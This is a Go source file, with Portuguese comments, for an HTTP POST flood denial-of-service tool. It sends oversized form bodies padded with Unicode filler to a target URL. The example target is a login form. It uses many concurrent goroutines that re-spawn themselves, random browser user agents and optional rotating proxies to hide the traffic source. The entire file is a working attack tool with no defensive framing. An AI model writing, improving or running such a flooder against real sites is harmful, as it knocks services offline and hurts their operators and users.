package main

import (
    "context"
    "os"
    "bytes"
    "strings"
    "flag"
    "fmt"
    "math/rand"
    "net/http"
    "net/url"
    "time"
    "path/filepath"
    "net/http/cookiejar"
)

var (
    targetURL      	string
    numConnections 	int
	params		 	string
	paramsParsed	map[string]string
    proxies        	[]string
	bodysize	 	int
    processTimeout  string 
    userAgents 		= []string{
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
    }
)
// Function to calculate the size of the body required for each parameter
func calculateParamSize(totalSize int, params []string) int {
	// Calculate the size for each parameter
	// Example: Total size of 127 KB, if there are 2 parameters, each should be about (127 KB - length of separators) / number of parameters
	// Adjust for URL encoding and key lengths

	numParams := len(params)
	if numParams == 0 {
		return 0
	}
    var actualSize int
    var paramsToFill int
    actualSize = 0
    paramsToFill = 0
	for _, pair := range params {
		parts := strings.SplitN(pair, "=", 2)
		if len(parts) != 2 {
			continue
		}
		key, value := parts[0], parts[1]
		if value == "AUTO" {
			paramsToFill = paramsToFill + 1
		}else{
            actualSize = actualSize + len(value) + len(key)
        }
	}
    return (totalSize - actualSize - (numParams * 1)) / paramsToFill; // 1 byte for each '&' or '&' for each key-value pair
}

// Function to generate a Unicode string of a specific size (in bytes)
func generateUnicodeString(sizeBytes int) string {
	var builder strings.Builder
	unicodeChar := "♞★Â§♘你好مرحباこんにちは🌐😊๓๔" // You can replace this with other Unicode characters
	for builder.Len() < sizeBytes {
		builder.WriteString(unicodeChar)
	}
	return builder.String()[:sizeBytes] // Ensure we only return the exact number of bytes
}

// Function to parse parameters and replace `AUTO` with a Unicode string
func parseParams(paramStr string, bodySize int) map[string]string {
	params := make(map[string]string)
	paramPairs := strings.Split(paramStr, "&")
	paramSize := calculateParamSize(bodySize, paramPairs)
    if paramSize < 0 {
        fmt.Println("Os parametros são maiores que o maximo de corpo.")
        os.Exit(1)
    }

	for _, pair := range paramPairs {
		parts := strings.SplitN(pair, "=", 2)
		if len(parts) != 2 {
			continue
		}
		key, value := parts[0], parts[1]
		if value == "AUTO" {
			value = generateUnicodeString(paramSize) // Adjust size as needed
		}
		params[key] = value
	}
	return params
}


func init() {
    // Definir flags para a URL, número de threads e proxies
    flag.StringVar(&targetURL, "url", "", "URL do servidor alvo (obrigatório)")
	flag.StringVar(&params, "params", "", "The POST parameters (e.g., log=AUTO&pwd=AUTO&rememberme=1&...) (Obrigatório)")
    flag.IntVar(&numConnections, "workers", 50, "Número de conexões simultâneas")
	proxiesInput := flag.String("proxies", "", "Lista de proxies separados por vírgula (ex: http://proxy1:port,http://proxy2:port)")
    flag.StringVar(&processTimeout, "process-timeout", "2m", "Tempo total do processo (ex: 5m, 1h)")
	flag.IntVar(&bodysize, "bodysize", 127*1024, "Tamanho do corpo da requisição em bytes")
    // Parsear os argumentos da linha de comando
    flag.Parse()

    // Validar se a URL foi fornecida
    if targetURL == "" {
        fmt.Println("A URL do servidor alvo é obrigatória.")
        flag.Usage()
        os.Exit(1)
    }

    // Separar os proxies pela vírgula se fornecidos
    if *proxiesInput != "" {
        proxies = strings.Split(*proxiesInput, ",")
    }

	if params == "" {
		fmt.Println("Os parâmetros POST são obrigatórios.")
		flag.Usage()
		os.Exit(1)
	}
	// Parse POST parameters
	paramsParsed = parseParams(params, bodysize)
}

func countOpenFiles() int {
    pid := os.Getpid()
    files, _ := filepath.Glob(fmt.Sprintf("/proc/%d/fd/*", pid))
    return len(files)
}

func parseDuration(durationStr string) time.Duration {
    d, err := time.ParseDuration(durationStr)
    if err != nil {
        fmt.Printf("Erro ao parsear duração %s: %v\n", durationStr, err)
        os.Exit(1)
    }
    return d
}
func isURLEncoded(input string) bool {
    decoded, err := url.QueryUnescape(input)
    if err != nil {
        return false // if there's an error, it's likely not a valid URL-encoded string
    }
    // Compare decoded and original string
    return decoded != input
}

func bodyForRequest() string {
    // Criando a string de corpo diretamente
    /* var body string
    for key, value := range paramsParsed {
        var variable string
        var valor string
        variable = key
        valor = value
        if(!isURLEncoded(key)) {
            variable = url.QueryEscape(key)
        }
        if( !isURLEncoded(value)) {
            valor = url.QueryEscape(value)
        }
        body += fmt.Sprintf("%s=%s&", variable, valor)
    }

    // Remove o último '&'
    if len(body) > 0 {
        body = body[:len(body)-1]
    }
    return body*/
    var bodyBuffer bytes.Buffer

    // Create the request body
    for key, value := range paramsParsed {
        bodyBuffer.WriteString(fmt.Sprintf("%s=%s&", key, value))
    }
    // Remove the trailing '&'
    body := bodyBuffer.String()
    if len(body) > 0 {
        body = body[:bodyBuffer.Len()-1]
    }
    return body
}


func attack(ctx context.Context, proxyURL string, stopChan <-chan struct{}) {
    select {
        case <-ctx.Done():
            return
		case <-stopChan:
			return
        default:  
            // Criando a string de corpo diretamente
            var body string
            body = bodyForRequest()

            // Set up the proxy
            proxyURLParsed, err := url.Parse(proxyURL) // Replace with your proxy URL
            if err != nil {
                fmt.Println("Error parsing proxy URL:", err)
                return
            }

            // Initialize the cookie jar
            jar, error := cookiejar.New(nil)
            if error != nil {
                fmt.Println("Error creating cookie jar:", error)
                os.Exit(1)
            }

            // Set up the transport with the proxy
            transport := &http.Transport{
                Proxy: http.ProxyURL(proxyURLParsed),
            }

            // Create a new HTTP client with the proxy transport
            client := &http.Client{
                Transport: transport,
                Jar:       jar, // Assign the cookie jar to the HTTP client
            }

			// Create a new request with the encoded parameters
            req, err := http.NewRequest("POST", targetURL, bytes.NewBufferString(body))
            if err != nil {
                go attack(ctx, proxyURL, stopChan)
                fmt.Println("Error creating request:", err)
                return
            }

            // Set headers for the request
            req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
            req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
			req.Header.Set("Connection", "keep-alive")
            req.Header.Set("Cache-Control", "no-cache")

            // Create an HTTP client and send the request
            resp, err := client.Do(req)
            if err != nil {
                go attack(ctx, proxyURL, stopChan)
                fmt.Println("Error making request:", err)
                return
            }
            defer resp.Body.Close()

            fmt.Println("Response status:", resp.Status)
            sizeInBytes := len(body)
            sizeInKB := float64(sizeInBytes) / 1024

            fmt.Printf("Tamanho do corpo em KB: %.2f KB\n", sizeInKB)
			go attack(ctx, proxyURL, stopChan)
    }
}
func attack_sem_proxy(ctx  context.Context, stopChan <-chan struct{}) {
    select {
        case <-ctx.Done():
            return
        case <-stopChan:
			return
        default:
            // Criando a string de corpo diretamente
            var body string
            body = bodyForRequest()


            // Inicializa o cookie jar (para manter cookies entre as requisições)
            jar, err := cookiejar.New(nil)
            if err != nil {
                go attack_sem_proxy(ctx, stopChan)
                fmt.Println("Error creating cookie jar:", err)
                return
            }

            // Cria um HTTP client com o cookie jar
            client := &http.Client{
                Jar: jar, // Atribui o cookie jar ao HTTP client
            }

            // Primeiro faz o GET request
            getReq, err := http.NewRequest("GET", targetURL, nil)
            if err != nil {
                go attack_sem_proxy(ctx, stopChan)
                fmt.Println("Error creating GET request:", err)
                return
            }

            // Define os headers para o GET
            getReq.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
            getReq.Header.Set("Connection", "keep-alive")
            getReq.Header.Set("Cache-Control", "no-cache")

            // Envia o GET request
            getResp, err := client.Do(getReq)
            if err != nil {
                go attack_sem_proxy(ctx, stopChan)
                fmt.Println("Error sending GET request:", err)
                return
            }
            defer getResp.Body.Close()

            // Aqui você pode processar a resposta do GET, se necessário
            fmt.Println("GET request successful, status code:", getResp.StatusCode)

            // Agora faz o POST request usando o mesmo client
            postReq, err := http.NewRequest("POST", targetURL, bytes.NewBufferString(body))
            if err != nil {
                go attack_sem_proxy(ctx, stopChan)
                fmt.Println("Error creating POST request:", err)
                return
            }

            // Define os headers para o POST
            postReq.Header.Set("Content-Type", "application/x-www-form-urlencoded")
            postReq.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
            postReq.Header.Set("Connection", "keep-alive")
            postReq.Header.Set("Cache-Control", "no-cache")

            // Envia o POST request
            postResp, err := client.Do(postReq)
            if err != nil {
                go attack_sem_proxy(ctx, stopChan)
                fmt.Println("Error sending POST request:", err)
                return
            }
            defer postResp.Body.Close()

            // Aqui você pode processar a resposta do POST, se necessário
            fmt.Println("POST request successful, status code:", postResp.StatusCode)
            sizeInBytes := len(body)
            sizeInKB := float64(sizeInBytes) / 1024

            fmt.Printf("Tamanho do corpo em KB: %.2f KB\n", sizeInKB)
            go attack_sem_proxy(ctx, stopChan)
/*
            // Ler o corpo da resposta
            bodyBytes, erro := ioutil.ReadAll(postResp.Body)
            if erro != nil {
                fmt.Println("Error reading response body:", erro)
                return
            }

            // Converter o corpo para string
            bodyN := string(bodyBytes)

            // Exibir o corpo da resposta
            fmt.Println("Response body:", bodyN)
*/
    }
}
func main() {
    processTimeout := parseDuration(processTimeout)

    ctx, cancel := context.WithTimeout(context.Background(), processTimeout)
    defer cancel()
    stopChan := make(chan struct{})
    fmt.Println("Iniciando ataque Post Flood em", targetURL)
    for i := 0; i < numConnections; i++ {
        if len(proxies) > 0 {
            go attack(ctx, proxies[rand.Intn(len(proxies))], stopChan)
        } else {
            go attack_sem_proxy(ctx, stopChan) // Sem proxy
        }
    }
    <-ctx.Done()
    // Envia sinal para parar todas as goroutines
    close(stopChan)
    fmt.Println("Processo finalizado.")
    os.Exit(0)
}
